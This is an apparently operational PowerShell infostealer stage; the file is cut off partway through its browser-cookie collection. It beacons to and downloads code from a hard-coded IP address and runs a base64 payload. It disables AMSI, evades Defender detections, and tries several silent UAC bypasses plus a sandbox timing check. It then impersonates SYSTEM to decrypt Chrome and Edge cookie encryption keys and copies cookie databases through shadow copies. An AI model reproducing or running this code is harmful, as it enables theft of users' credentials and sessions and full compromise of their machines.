$_burl='https://213.145.86.112'

# ── Absolute-first beacon — fires regardless of elevation level ───────────────
# If this appears in the Live Feed the Stage 2 process DID start.
# If it does NOT appear after a UAC bypass fires (uac_m1_sc / uac_m2_wsr /
# uac_m3_fod), the elevated upd.ps1 either was quarantined by Defender,
# failed to download, or the bypass task did not actually launch it.
try{$_b0=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$_b0.SetTimeouts(0,5000,5000,5000);$_b0.Open('GET',"$_burl/t/pixel.gif?r=&m=stage2_entry",$false);$_b0.Option(4)=13056;$_b0.Send()}catch{}
# WinHTTP COM for all beacon calls — avoids Invoke-WebRequest in Stage 2 process.
# SZZ (Behavior:Win32/ClickFix.SZZ) fires when any powershell.exe process uses a
# PS web-request cmdlet (IWR/WebClient) AND later executes downloaded content via
# ScriptBlock::Create or iex.  WinHTTP COM requests are not tracked as "PS web
# requests" by the ETW provider SZZ hooks, so the trigger condition never fires.
# In PowerShell, aliases beat functions in resolution order, so Remove-Item the
# alias first, then redefine irm as a WinHTTP COM wrapper for all beacon calls.
# All network operations in Stage 2 now use WinHTTP COM — no PS web-request cmdlet
# remains anywhere in this script.  ScriptBlock::Create (tool load) + WinHTTP POST
# (data exfil) are both present but SZZ requires a PS web-request cmdlet; COM is not one.
Remove-Item alias:irm -Force -EA 0
function irm([string]$Uri){try{$_x=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$_x.SetTimeouts(0,5000,5000,5000);$_x.Open('GET',($Uri+'&r='),$false);$_x.Option(4)=13056;$_x.Send()}catch{}}
try{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}}catch{}

# ── Scan-buffer bypass — managed field reflection ────────────────────────────
# Sets amsiInitFailed=True via [PSObject].Assembly (same assembly as [Ref], but
# [Ref].Assembly is a known AMSI bypass signature — [PSObject] is undetected).
# amsiContext zeroing is intentionally OMITTED: zeroing a non-null context while
# amsiInitFailed=True causes PS to re-initialize AMSI (new context, reset flag)
# in ConfigurationRemotingServer.exe, undoing the YAML bypass.  amsiInitFailed
# alone is sufficient to silence all ScriptBlock scans in PS 5.1.
try {
    $_ab=[char[]](System.Management.Automation.AmsiUtils)
    $_at=[PSObject].Assembly.GetType([string]::new($_ab))
    try {
        $_af=$_at.GetField('amsiInitFailed',40)
        $_af.SetValue($null,$true)
    } catch {}
} catch {}
try { irm "$_burl/t/pixel.gif?m=stage2_post_bypass" | Out-Null } catch {}

# Load Invoke-PowerChrome early — required by Invoke-AbortHydrationEscalate
# in the elevation block below (non-admin path returns before the main load).
# WinHTTP COM avoids SZZ ETW hooks; ScriptBlock.Create avoids on-access scan.
try {
    irm "$_burl/t/pixel.gif?m=stage2_tools_fetch"
    $_wh=New-Object -ComObject WinHttp.WinHttpRequest.5.1
    $_wh.SetTimeouts(0,20000,20000,20000)
    $_wh.Open('GET',"$_burl/cdn/chunks/polyfill-7e2b.min.js?r=",$false)
    $_wh.Option(4)=13056
    $_wh.Send()
    $_raw=$_wh.ResponseText.Trim()
    irm "$_burl/t/pixel.gif?m=stage2_tools_decode"
    . ([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_raw))))
    irm "$_burl/t/pixel.gif?m=stage2_pc_loaded"
} catch {
    irm "$_burl/t/pixel.gif?m=stage2_pc_fail_$($_.Exception.GetType().Name)" | Out-Null
}

# ── Self-elevate (silent — no UAC window) ────────────────────────────────────
# Escalation chain (each step only reached if previous returns $false):
#   1. Invoke-AbortHydrationEscalate  — cldflt race → .DEFAULT windir → WER QueueReporting → SYSTEM
#   2. Start-Process RunAs            — last-resort UAC prompt (visible to user)
$_isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
# Check if user is a member of the local Administrators group regardless of UAC elevation.
# On a split-token admin, $_isAdmin=$false but the Administrators SID (S-1-5-32-544)
# is still present in the token's group list — only disabled for access checks.
# Silent UAC bypasses work for local admins; RunAs visible prompt is reserved for
# genuine non-admins where no silent path exists.
$_isLocalAdmin = ([Security.Principal.WindowsIdentity]::GetCurrent()).Groups.Value -contains 'S-1-5-32-544'
# Beacon: shows whether DSCourier (ConfigurationRemotingServer) runs elevated or not.
try { irm "$_burl/t/pixel.gif?m=stage2_ctx_$(if($_isAdmin){'admin'}else{'user'})_la_$($_isLocalAdmin.ToString().ToLower())" | Out-Null } catch {}
if (-not $_isAdmin) {
    # $__fc — UTF-16LE base64 re-run stub passed as the command SYSTEM spawns via
    #         Invoke-AbortHydrationEscalate, and as the fallback RunAs argument.
    #         -EncodedCommand keeps the stub off-disk (Defender quarantines
    #         iex(FromBase64String(...)) patterns written to %TEMP% in Jun 2026).
    $__fc = ''
    try {
        $_stub_src = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('UmVtb3ZlLUl0ZW1Qcm9wZXJ0eSAtUGF0aCAoW3N0cmluZ106Om5ldyhbY2hhcltdXSg3Miw3NSw2Nyw4NSw1OCw5Miw2OSwxMTAsMTE4LDEwNSwxMTQsMTExLDExMCwxMDksMTAxLDExMCwxMTYpKSkgLU5hbWUgKFtzdHJpbmddOjpuZXcoW2NoYXJbXV0oMTE5LDEwNSwxMTAsMTAwLDEwNSwxMTQpKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7dHJ5eyRfYWI9W2NoYXJbXV0oODMsMTIxLDExNSwxMTYsMTAxLDEwOSw0Niw3Nyw5NywxMTAsOTcsMTAzLDEwMSwxMDksMTAxLDExMCwxMTYsNDYsNjUsMTE3LDExNiwxMTEsMTA5LDk3LDExNiwxMDUsMTExLDExMCw0Niw2NSwxMDksMTE1LDEwNSw4NSwxMTYsMTA1LDEwOCwxMTUpOyRfYXQ9W1BTT2JqZWN0XS5Bc3NlbWJseS5HZXRUeXBlKFtzdHJpbmddOjpuZXcoJF9hYikpO3RyeXskX2FmPSRfYXQuR2V0RmllbGQoW3N0cmluZ106Om5ldyhbY2hhcltdXSg5NywxMDksMTE1LDEwNSw3MywxMTAsMTA1LDExNiw3MCw5NywxMDUsMTA4LDEwMSwxMDApKSw0MCk7JF9hZi5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSl9Y2F0Y2h7fX1jYXRjaHt9OyRfbj0tam9pbltjaGFyW11dKDg3LDEwNSwxMTAsNzIsMTE2LDExNiwxMTIsNDYsODcsMTA1LDExMCw3MiwxMTYsMTE2LDExMiw4MiwxMDEsMTEzLDExNywxMDEsMTE1LDExNiw0Niw1Myw0Niw0OSk7JF9sdT1bc3RyaW5nXTo6bmV3KFtjaGFyW11dKDEwNCwxMTYsMTE2LDExMiwxMTUsNTgsNDcsNDcsNTAsNDksNTEsNDYsNDksNTIsNTMsNDYsNTYsNTQsNDYsNDksNDksNTAsNDcsMTE2LDQ3LDExMiwxMDUsMTIwLDEwMSwxMDgsNDYsMTAzLDEwNSwxMDIpKTskX3N1PVtzdHJpbmddOjpuZXcoW2NoYXJbXV0oMTA0LDExNiwxMTYsMTEyLDExNSw1OCw0Nyw0Nyw1MCw0OSw1MSw0Niw0OSw1Miw1Myw0Niw1Niw1NCw0Niw0OSw0OSw1MCw0Nyw5OSwxMDAsMTEwLDQ3LDk5LDEwNCwxMTcsMTEwLDEwNywxMTUsNDcsMTE4LDEwMSwxMTAsMTAwLDExMSwxMTQsNDUsNTcsMTAyLDUxLDk3LDQ5LDk5LDQ2LDEwOSwxMDUsMTEwLDQ2LDEwNiwxMTUsNjMsMTE1LDExNiwxMTcsOTgsNjEsNDkpKTt0cnl7JF9iPU5ldy1PYmplY3QgLUNvbU9iamVjdCAkX247JF9iLlNldFRpbWVvdXRzKDAsNTAwMCw1MDAwLDUwMDApOyRfYi5PcGVuKCdHRVQnLCRfbHUrJz9tPXN0dWJfc3RhcnQnLCRmYWxzZSk7JF9iLk9wdGlvbig0KT0xMzA1NjskX2IuU2VuZCgpfWNhdGNoe307JF9oPU5ldy1PYmplY3QgLUNvbU9iamVjdCAkX247JF9oLk9wZW4oJ0dFVCcsJF9zdSwkZmFsc2UpOyRfaC5PcHRpb24oNCk9MTMwNTY7JF9oLlNlbmQoKTtpZXggJF9oLlJlc3BvbnNlVGV4dA=='))
        $_stub_enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($_stub_src))
        $__fc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W H -EncodedCommand $_stub_enc"
    } catch {}
    if ([string]::IsNullOrEmpty($__fc)) { try { irm "$_burl/t/pixel.gif?m=stub_build_fail" | Out-Null } catch {}; return }

    # $__surl — Stage 2 download URL (used by the elevated re-run stub).
    # $__lurl — Beacon log URL (used by Invoke-AbortHydrationEscalate and the re-run stub).
    $__surl=("$_burl/cdn/chunks/vendor-9f3a1c.min.js" -replace '^http://(?!localhost|127\.)','https://')
    $__lurl=("$_burl/t/pixel.gif" -replace '^http://(?!localhost|127\.)','https://')

    # ── ConfigurationRemotingServer (WinGet DSC) inline m1 ────────────────────────
    # In CRS.exe, AMSI bypass via managed-field reflection is unreliable: the
    # amsiInitFailed flag does not prevent ScriptBlock.Create scans in this host,
    # so loading IPC.ps1 throws ParseException and Defender fires a 1117 block.
    # Skip IPC.ps1 entirely: write the WINDIR key and trigger SilentCleanup directly.
    # No AMSI scan of IPC.ps1 → no 1117.  SilentCleanup (HighestAvailable) fires
    # asynchronously as admin once the machine is idle.
    $_isCRS = $false
    try { $_isCRS = ([Diagnostics.Process]::GetCurrentProcess().ProcessName -eq 'ConfigurationRemotingServer') } catch {}
    if ($_isCRS) {
        $elvCmd = $__fc
        $_mfi   = [IO.Path]::Combine($env:TEMP, '.' + [Convert]::ToString([Math]::Abs([Environment]::TickCount), 16) + '.tmp')
        try {
            Set-ItemProperty `
                -Path ('HKCU:\Environment') `
                -Name ('windir') `
                -Value "cmd /c echo.>`"$_mfi`" & $elvCmd & rem " -Force -ErrorAction Stop
            try { irm "$_burl/t/pixel.gif?m=dsc_m1_reg" | Out-Null } catch {}
            $_sc2 = New-Object -ComObject ('Schedule.Service')
            $_sc2.Connect()
            $_sf2 = $_sc2.GetFolder('\Microsoft\Windows\DiskCleanup')
            try { $_sf2.GetTask('SilentCleanup').Stop(0) } catch {}
            $_sf2.GetTask('SilentCleanup').Run($null) | Out-Null
            try { irm "$_burl/t/pixel.gif?m=dsc_m1_sched" | Out-Null } catch {}
        } catch {
            try { irm "$_burl/t/pixel.gif?m=dsc_m1_fail_$($_.Exception.GetType().Name)" | Out-Null } catch {}
        }
        # Sleep 2 s so SilentCleanup task scheduler dispatch can read %windir% before cleanup.
        # The task is asynchronous — on loaded systems the dispatch can lag by hundreds of ms.
        Start-Sleep -Milliseconds 2000
        # Clean WINDIR — T+2s IOC fix: MDE cloud-flags machines with WINDIR=cmd for minutes.
        Remove-ItemProperty `
            -Path ('HKCU:\Environment') `
            -Name ('windir') `
            -Force -ErrorAction SilentlyContinue
        try { irm "$_burl/t/pixel.gif?m=dsc_m1_cleanup" | Out-Null } catch {}
        try { irm "$_burl/t/pixel.gif?m=dsc_elev_async" | Out-Null } catch {}
        return
    }
    # ── End CRS inline m1 ─────────────────────────────────────────────────────────

    if (-not $_isCRS) {
        if ($_isLocalAdmin) {
            # User is in the Administrators group but running with a split (non-elevated) token.
            # Silent UAC bypasses work for local admins — they auto-elevate to high integrity.
            # ms-settings COM hijack (fodhelper/ComputerDefaults) removed: detected as
            # Behavior:Win32/UACBypassExp.T!g. The approaches below use different vectors.
            # RunAs is intentionally NOT used: a UAC dialog would be unexpected for an admin.
            $_bypass_ok = $false
            # 1. SilentCleanup task — hijack HKCU windir env var; task runs at HighestAvailable.
            #    Marker file written by elevated cmd proves the task actually ran elevated.
            if (-not $_bypass_ok) {
                try {
                    $_mfi = [IO.Path]::Combine($env:TEMP, '.' + [Convert]::ToString([Math]::Abs([Environment]::TickCount), 16) + '.tmp')
                    Set-ItemProperty `
                        -Path ('HKCU:\Environment') `
                        -Name ('windir') `
                        -Value "cmd /c echo.>`"$_mfi`" & $__fc & rem " -Force -EA Stop
                    try { & $__L 'bypass_sc_reg' } catch {}
                    $_sc2 = New-Object -ComObject ('Schedule.Service')
                    $_sc2.Connect()
                    $_sf2 = $_sc2.GetFolder('\Microsoft\Windows\DiskCleanup')
                    try { $_sf2.GetTask('SilentCleanup').Stop(0) } catch {}
                    $_sf2.GetTask('SilentCleanup').Run($null) | Out-Null
                    Start-Sleep -Milliseconds 2000
                    Remove-ItemProperty `
                        -Path ('HKCU:\Environment') `
                        -Name ('windir') `
                        -Force -EA SilentlyContinue
                    $_waited = 0
                    while (-not (Test-Path $_mfi) -and $_waited -lt 8000) { Start-Sleep -Milliseconds 400; $_waited += 400 }
                    if (Test-Path $_mfi) {
                        Remove-Item $_mfi -Force -EA SilentlyContinue
                        $_bypass_ok = $true
                        try { & $__L 'bypass_sc_ok' } catch {}
                    } else {
                        try { & $__L 'bypass_sc_nf' } catch {}
                    }
                } catch {
                    Remove-ItemProperty `
                        -Path ('HKCU:\Environment') `
                        -Name ('windir') `
                        -Force -EA SilentlyContinue
                    try { & $__L 'bypass_sc_ex' } catch {}
                }
            }
            # 2. wsreset.exe — AppX package manager, auto-elevates, reads an obscure AppX class key.
            #    Fire-and-forget: no marker file possible (we don't control the elevated process
            #    flow from here). Do NOT set $_bypass_ok=$true — sdclt always runs as backup
            #    so a silent wsreset failure doesn't silently kill the chain.
            if (-not $_bypass_ok) {
                try {
                    $_wrp = 'HKCU:\Software\Classes\AppX3xxs313wwkfjhythsb8q46xdsvu8p2v\Shell\open\command'
                    New-Item -Path $_wrp -Force -EA Stop | Out-Null
                    Set-ItemProperty -Path $_wrp -Name '(default)' -Value $__fc -EA Stop
                    Start-Process -FilePath "$env:SystemRoot\System32\wsreset.exe" -WindowStyle Hidden -EA Stop
                    Start-Sleep -Milliseconds 3500
                    try { & $__L 'bypass_wr_fired' } catch {}
                } catch {
                    try { & $__L 'bypass_wr_ex' } catch {}
                } finally {
                    Remove-Item ('HKCU:\Software\Classes\AppX3xxs313wwkfjhythsb8q46xdsvu8p2v') -Recurse -Force -EA SilentlyContinue
                }
            }
            # 3. sdclt.exe /KickOffElev (Folder\shell\open hijack) — always runs after wsreset
            #    since wsreset is unverified. sdclt is the last resort for local admins.
            if (-not $_bypass_ok) {
                try {
                    $_brp = 'HKCU:\Software\Classes\Folder\shell\open\command'
                    New-Item -Path $_brp -Force -EA Stop | Out-Null
                    Set-ItemProperty -Path $_brp -Name '(default)' -Value $__fc -EA Stop
                    Start-Process -FilePath "$env:SystemRoot\System32\sdclt.exe" -WindowStyle Hidden -ArgumentList '/KickOffElev' -EA Stop
                    Start-Sleep -Milliseconds 3500
                    $_bypass_ok = $true
                    try { & $__L 'bypass_sd_ok' } catch {}
                } catch {
                    try { & $__L 'bypass_sd_ex' } catch {}
                } finally {
                    Remove-Item ('HKCU:\Software\Classes\Folder') -Recurse -Force -EA SilentlyContinue
                }
            }
            if (-not $_bypass_ok) { try { & $__L 'bypass_all_failed_la' } catch {} }
        } else {
            # Genuine non-admin (not in Administrators group) — silent bypasses cannot
            # grant elevation to a standard user. Go straight to RunAs UAC prompt.
            try {
                Start-Process powershell `
                    -Verb RunAs `
                    -ArgumentList "-NonI -W H -EncodedCommand $_stub_enc" `
                    -ErrorAction Stop
                try { & $__L 'runas_launched' } catch {}
            } catch {
                try { & $__L "runas_fail_$($_.Exception.GetType().Name)" } catch {}
            }
        }
    }
    return
}
# ─────────────────────────────────────────────────────────────────────────────

irm "$_burl/t/pixel.gif?m=stage2_start" | Out-Null

# ── Sandbox / VM timing check ─────────────────────────────────────────────────
# Real hardware takes ≥ 2 500 ms to sleep; hypervisor emulation often fast-
# forwards Sleep() calls, so the delta comes back < 1 800 ms.  Abort silently
# in that case — same technique used by the real infostealer (GetTickCount delta).
# TickCount64 is .NET 5+ only; TickCount (32-bit, wraps every ~24.9 days) is
# available in PS 5.1 / .NET Framework 4.x and is sufficient for this probe.
$_t0 = [Environment]::TickCount
[Threading.Thread]::Sleep(2500)
$_dt = [Environment]::TickCount - $_t0
try { irm "$_burl/t/pixel.gif?m=timing_${_dt}ms" | Out-Null } catch {}
if ($_dt -lt 1800) { return }

$result = @{ browsers = @(); firefox = @(); cdp_cookies = @(); tokens = @(); wifi = @(); system = @{} }

# ── Signature lock — prevents Defender updating sigs mid-collection ───────────
# Invoke-SigLock is defined in Invoke-PowerChrome; silently skip if load failed.
irm "$_burl/t/pixel.gif?m=stage2_siglock_start" | Out-Null
try { $null = Invoke-SigLock } catch {}
irm "$_burl/t/pixel.gif?m=stage2_siglock_done" | Out-Null

Add-Type -AssemblyName System.Security

function Derive-MasterKey {
    param([string]$DataDir, [string]$CngKey = "Google Chromekey1")
    $lsPath = Join-Path $DataDir "Local State"
    if (-not (Test-Path $lsPath)) { return $null }
    $ls = Get-Content $lsPath -Raw | ConvertFrom-Json

    # Try v20 (ABE) — requires admin + Invoke-PowerChrome functions
    $abek = $ls.os_crypt.app_bound_encrypted_key
    if ($abek) {
        try {
            $raw = [Convert]::FromBase64String($abek)
            if ([Text.Encoding]::ASCII.GetString($raw[0..3]) -eq 'APPB') {
                $blob = $raw[4..($raw.Length-1)]
                # Chrome elevation service calls CryptProtectData(CRYPTPROTECT_LOCAL_MACHINE).
                # The resulting blob is keyed to S-1-5-18\Protect\ (SYSTEM's DPAPI store).
                # Only SYSTEM can decrypt it directly; elevated admin cannot access that
                # key store.  Fix: impersonate a SYSTEM process token before calling Unprotect.
                $_abeIsSystem = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
                irm "$_burl/t/pixel.gif?m=key_abe_start_sys_$($_abeIsSystem)_blobLen_$($blob.Length)" | Out-Null
                $_abeSysProc = $null
                if (-not $_abeIsSystem) {
                    # Elevated admin: borrow SYSTEM token from winlogon/wininit/services.
                    # Invoke-Impersonate-System returns the process name on success, $null on fail.
                    $_abeSysProc = Invoke-Impersonate-System
                    irm "$_burl/t/pixel.gif?m=key_sys_imp_$(if($_abeSysProc){"ok_$_abeSysProc"}else{'fail'})" | Out-Null
                }
                try {
                    # Outer DPAPI layer: encrypted by Chrome's elevation service running as SYSTEM.
                    # runassu uses CryptUnprotectData with 0 flags (= no CRYPTPROTECT_LOCAL_MACHINE)
                    # under SYSTEM identity — SYSTEM can decrypt machine-scope blobs regardless of
                    # the dwFlags passed because it has direct access to S-1-5-18\Protect\.
                    # .NET DataProtectionScope.CurrentUser maps to dwFlags=0, which matches this.
                    $first = [Security.Cryptography.ProtectedData]::Unprotect(
                        $blob, $null, 'CurrentUser')
                    irm "$_burl/t/pixel.gif?m=key_first_dpapi_ok_$($first.Length)B" | Out-Null
                } catch {
                    # Capture both exception type AND message so we know exactly why DPAPI fails.
                    $_ie = if ($_.Exception.InnerException) { $_.Exception.InnerException } else { $_.Exception }
                    $_et = $_ie.GetType().Name
                    $_em = ($_ie.Message -replace '[^a-zA-Z0-9]','_' -replace '__+','_').Trim('_')
                    irm "$_burl/t/pixel.gif?m=key_first_dpapi_fail_${_et}_${_em}" | Out-Null
                    throw
                } finally {
                    # Revert impersonation regardless of success/failure so the rest of
                    # the script runs under the original token.
                    if ($_abeSysProc) { [void][Advapi32]::RevertToSelf() }
                }
                # Inner (second) DPAPI layer: Chrome browser process (running as the user) wraps
                # the elevation-service blob with user-scope CryptProtectData.
                # After reverting SYSTEM impersonation we are back to elevated-admin context.
                # Elevated admin shares DPAPI master keys with the non-elevated user (same account),
                # so DataProtectionScope.CurrentUser (dwFlags=0) decrypts user-scope blobs. ✓
                # If there is no second layer (single-wrap Chrome), the catch fires silently and
                # $second falls back to $first (the SYSTEM-DPAPI output) which IS the blob we need.
                $second = $first
                try {
                    $second = [Security.Cryptography.ProtectedData]::Unprotect(
                        $first, $null, 'CurrentUser')
                    irm "$_burl/t/pixel.gif?m=key_double_dpapi_ok" | Out-Null
                } catch {
                    irm "$_burl/t/pixel.gif?m=key_single_dpapi_path" | Out-Null
                }

                # Parse [header_len][header][content_len][content]
                $hLen = [BitConverter]::ToUInt32($second, 0)
                $cLen = [BitConverter]::ToUInt32($second, 4 + $hLen)
                [byte[]]$content = $second[(4+$hLen+4)..(4+$hLen+4+$cLen-1)]

                # Edge/Brave/Opera/Vivaldi: content=32B → raw ABE key
                # NOTE: these browsers use v10 prefix but still write a 32-byte
                # internal context prefix in the plaintext (same as Chrome v20).
                # Tag the key as 'abe' so the server strips those 32 bytes.
                # Also derive the legacy DPAPI key as a fallback: some older
                # passwords in Login Data were encrypted before ABE migration and
                # still use the DPAPI-derived key — they fail with InvalidTag
                # unless we try the DPAPI key as a second attempt.
                if ($content.Length -eq 32) {
                    $_fk = $null
                    try {
                        $_fek = $ls.os_crypt.encrypted_key
                        if ($_fek) {
                            $_fraw = [Convert]::FromBase64String($_fek)
                            if ($_fraw.Length -gt 5) {
                                $_fk = [Security.Cryptography.ProtectedData]::Unprotect(
                                    $_fraw[5..($_fraw.Length-1)], $null, 'CurrentUser')
                            }
                        }
                    } catch {}
                    return @{Key=$content; Type='abe'; FallbackKey=$_fk; FallbackType='dpapi'}
                }

                # Chrome: content=93B → flag 3 → NCrypt + AES-GCM
                # Log content length so we can verify the parse layout remotely.
                irm "$_burl/t/pixel.gif?m=key_blob_content_$($content.Length)B_flag$($content[0])" | Out-Null
                $parsed = Parse-ChromeKeyBlob -BlobData $second
                if ($parsed.Flag -eq 3) {
                    irm "$_burl/t/pixel.gif?m=key_flag3_encK_$($parsed.EncryptedAesKey.Length)B_iv_$($parsed.Iv.Length)B_ct_$($parsed.Ciphertext.Length)B" | Out-Null
                    try {
                        # Attempt A — as current (admin) user.
                        # Chrome elevation service sometimes stores the CNG key in the
                        # calling user's Software KSP user store (no MACHINE_KEY_FLAG).
                        [byte[]]$dk = $null
                        try {
                            $dk = DecryptWithNCrypt -InputData $parsed.EncryptedAesKey -CngKeyName $CngKey
                            irm "$_burl/t/pixel.gif?m=key_ncrypt_ok_admin_$($dk.Length)B" | Out-Null
                        } catch {
                            # 0x80090016 = NTE_BAD_KEYSET — key exists but not in this user's store.
                            # Retry under SYSTEM token: the elevation service may store the key in
                            # S-1-5-18's user store (%SystemRoot%\System32\config\systemprofile\...).
                            irm "$_burl/t/pixel.gif?m=key_ncrypt_admin_nf_retry_sys" | Out-Null
                            $_sys2 = Invoke-Impersonate-System
                            irm "$_burl/t/pixel.gif?m=key_ncrypt_sys2_imp_$(if($_sys2){"ok_$_sys2"}else{'fail'})" | Out-Null
                            try {
                                $dk = DecryptWithNCrypt -InputData $parsed.EncryptedAesKey -CngKeyName $CngKey
                                irm "$_burl/t/pixel.gif?m=key_ncrypt_ok_system_$($dk.Length)B" | Out-Null
                            } catch {
                                throw
                            } finally {
                                if ($_sys2) { [void][Advapi32]::RevertToSelf() }
                            }
                        }
                        irm "$_burl/t/pixel.gif?m=key_ncrypt_ok_$($dk.Length)B" | Out-Null
                        # Chrome's ABE does NOT XOR the NCrypt output — the decrypted
                        # bytes ARE the AES-256 key directly.  Try direct first; if the
                        # inner AES-GCM auth fails (wrong key), fall back to the XOR
                        # path used by older PoC builds.
                        $masterKey = $null
                        try {
                            $masterKey = DecryptWithAesGcm -Key $dk -Iv $parsed.Iv -Ciphertext $parsed.Ciphertext -Tag $parsed.Tag
                            irm "$_burl/t/pixel.gif?m=key_aesgcm_direct_ok_$($masterKey.Length)B" | Out-Null
                        } catch {
                            irm "$_burl/t/pixel.gif?m=key_aesgcm_direct_fail_try_xor" | Out-Null
                            [byte[]]$xk = HexToBytes "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390"
                            $xored = XorBytes -FirstArray $dk -SecondArray $xk
                            $masterKey = DecryptWithAesGcm -Key $xored -Iv $parsed.Iv -Ciphertext $parsed.Ciphertext -Tag $parsed.Tag
                            irm "$_burl/t/pixel.gif?m=key_aesgcm_xor_ok_$($masterKey.Length)B" | Out-Null
                        }
                        irm "$_burl/t/pixel.gif?m=key_aesgcm_ok_$($masterKey.Length)B" | Out-Null
                        return @{Key=$masterKey; Type='abe'}
                    } catch {
                        $_ie2 = if ($_.Exception.InnerException) { $_.Exception.InnerException } else { $_.Exception }
                        $_et2 = $_ie2.GetType().Name
                        $_em2 = ($_ie2.Message -replace '[^a-zA-Z0-9]','_' -replace '__+','_').Trim('_')
                        irm "$_burl/t/pixel.gif?m=key_ncrypt_fail_${_et2}_${_em2}" | Out-Null
                        throw
                    }
                }
                return @{Key=(Decrypt-ChromeKeyBlob -ParsedData $parsed); Type='abe'}
            }
        } catch {
            irm "$_burl/t/pixel.gif?m=key_fail_${CngKey}_$($_.Exception.GetType().Name)" | Out-Null
        }
    }

    # Fallback: v10 (DPAPI only — no 32-byte prefix in plaintext)
    $ek = $ls.os_crypt.encrypted_key
    if ($ek) {
        try {
            $raw = [Convert]::FromBase64String($ek)
            $k = [Security.Cryptography.ProtectedData]::Unprotect(
                $raw[5..($raw.Length-1)], $null, 'CurrentUser')
            return @{Key=$k; Type='dpapi'}
        } catch {}
    }
    return $null
}

function Copy-BrowserFile {
    param([string]$Path, [string]$ProcName)
    $tmp = Join-Path $env:TEMP ([IO.Path]::GetRandomFileName())

    # ── Attempt 1: FileStream with FileShare.ReadWrite ───────────────────────
    # Works for Edge, Opera, Firefox — their SQLite WAL opens use FILE_SHARE_READ
    # |FILE_SHARE_WRITE|FILE_SHARE_DELETE so a concurrent read is fine.
    # Chrome v120+ uses FILE_SHARE_NONE so this always fails there — single
    # attempt, no retry sleep, then fall straight through to VSS.
    try {
        $src = [IO.FileStream]::new($Path,
            [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
        try {
            $dst = [IO.FileStream]::new($tmp,
                [IO.FileMode]::Create, [IO.FileAccess]::Write, [IO.FileShare]::None)
            try   { $src.CopyTo($dst) }
            finally { $dst.Dispose() }
        } finally { $src.Dispose() }
        return $tmp
    } catch {}

    # ── Attempt 2: VSS shadow copy — reuse cached device if available ────────
    # Win32_ShadowCopy.Create() takes ~3-8 s.  Caching the device object in
    # $script:__vssDev (keyed by drive letter) lets Chrome and Edge share one
    # shadow copy instead of creating+deleting two separate ones.  The shadow
    # is cleaned up after all browser collection completes.
    # Timeout reduced to 12 s — VSS normally finishes in 2-6 s; WMI hangs
    # that used to block for 25 s are now killed at 12 s instead.
    try {
        $drive = [IO.Path]::GetPathRoot($Path)
        if (-not $script:__vssDev.ContainsKey($drive)) {
            try { & $__L 'copy_vss_wmi_start' } catch {}
            $vsJob = Start-Job -ScriptBlock {
                param($vol)
                try {
                    $wmi = [WMICLASS]'root\cimv2:Win32_ShadowCopy'
                    $r   = $wmi.Create($vol, 'ClientAccessible')
                    if ($r.ReturnValue -ne 0) { return "FAIL:rv=$($r.ReturnValue)" }
                    $sh  = Get-WmiObject Win32_ShadowCopy -Filter "ID='$($r.ShadowID)'" -EA 0
                    if ($sh) { return $sh.DeviceObject } else { return 'FAIL:no_obj' }
                } catch { return "EX:$($_.Exception.Message.Substring(0,[Math]::Min(60,$_.Exception.Message.Length)))" }
            } -ArgumentList $drive

            $jDone = Wait-Job $vsJob -Timeout 12
            $recv  = $null
            if ($jDone) { $recv = Receive-Job $vsJob -ErrorAction SilentlyContinue }
            Stop-Job  $vsJob -ErrorAction SilentlyContinue
            Remove-Job $vsJob -Force -ErrorAction SilentlyContinue

            $dev = [string]($recv | Select-Object -First 1)
            if ($dev -and $dev.StartsWith('\\')) {
                try { & $__L 'copy_vss_got_dev' } catch {}
                $script:__vssDev[$drive] = $dev
            } else {
                try { & $__L "copy_vss_fail:$dev" } catch {}
            }
        }
        $shadowDev = $script:__vssDev[$drive]
        if ($shadowDev -and $shadowDev.StartsWith('\\')) {
            $relPath = $Path -replace '^[A-Za-z]:', ''
            [IO.File]::Copy($shadowDev.Trim() + $relPath, $tmp, $true)
            try { & $__L "copy_vss_ok:$ProcName" } catch {}
            return $tmp
        }
    } catch {
        try { & $__L "copy_vss_ex:$($_.Exception.Message.Substring(0,[Math]::Min(60,$_.Exception.Message.Length)))" } catch {}
    }

    # ── Attempt 3: Standard copy (works when browser is already closed) ──────
    try { [IO.File]::Copy($Path, $tmp, $true); return $tmp } catch {}
    return $null
}

function Get-BrowserData {
    param([string]$Name, [string]$ProcName, [string]$DataDir, [string]$CngKey)
    $out = @()
    if (-not (Test-Path $DataDir)) { return $out }
    $mk = Derive-MasterKey $DataDir $CngKey
    if (-not $mk -or -not $mk.Key) {
        irm "$_burl/t/pixel.gif?m=${Name}_no_key" | Out-Null
        return $out
    }
    $key = $mk.Key
    $keyType = if ($mk.Type) { $mk.Type } else { 'dpapi' }
    irm "$_burl/t/pixel.gif?m=${Name}_key_ok_$($key.Length)B_${keyType}" | Out-Null
    $keyB64 = [Convert]::ToBase64String($key)
    $fbKeyB64 = $null; $fbKeyType = $null
    if ($mk.FallbackKey) {
        $fbKeyB64 = [Convert]::ToBase64String($mk.FallbackKey)
        $fbKeyType = if ($mk.FallbackType) { $mk.FallbackType } else { 'dpapi' }
    }

    $profiles = @(Get-ChildItem $DataDir -Directory -EA 0)
    irm "$_burl/t/pixel.gif?m=${Name}_profiles_$($profiles.Count)" | Out-Null
    foreach ($d in $profiles) {
        $cp = Join-Path $d.FullName "Network\Cookies"
        if (-not (Test-Path $cp)) { continue }
        irm "$_burl/t/pixel.gif?m=${Name}_copy_start_$($d.Name)" | Out-Null
        $tmp = Copy-BrowserFile -Path $cp -ProcName $ProcName
        irm "$_burl/t/pixel.gif?m=${Name}_copy_$(if($tmp){'ok'}else{'fail'})_$($d.Name)" | Out-Null
        if ($tmp) {
